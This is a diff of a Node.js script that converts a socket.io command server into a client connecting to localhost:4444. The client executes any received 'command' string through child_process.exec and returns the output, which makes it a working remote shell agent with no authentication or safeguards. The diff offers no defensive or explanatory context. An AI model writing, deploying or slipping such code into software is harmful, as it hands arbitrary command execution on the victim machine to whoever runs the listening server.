@@ -1,38 +1,34 @@
 import { exec } from 'child_process';
 import { config } from 'dotenv';
-import { Server } from "socket.io";
+import { io } from 'socket.io-client';
 
-async function handle(){
+async function handle() {
     config()
 
-    const server = new Server()
+    const socket = io("http://localhost:4444")
 
-    console.log(process.env.PORT)
+    socket.on('connect', async () => {
 
-    const handler = server.listen(Number(process.env.PORT))
-
-    console.log('Listening...')
-
-    handler.on("connection", (socket) => {
         socket.on("command", (command) => {
             console.log('Receiving command: ', command);
-    
+
             exec(command, (error, stdout, stderr) => {
-                if(error){
+                if (error) {
                     socket.emit("result", error.message)
                     return;
                 }
-    
-                if(stderr) {
+
+                if (stderr) {
                     socket.emit("result", stderr)
                     return;
                 }
-                
+
                 console.log('Sending result: ', stdout)
                 socket.emit('result', stdout)
             })
         })
-    })
+
+    });
 }
 
 handle()
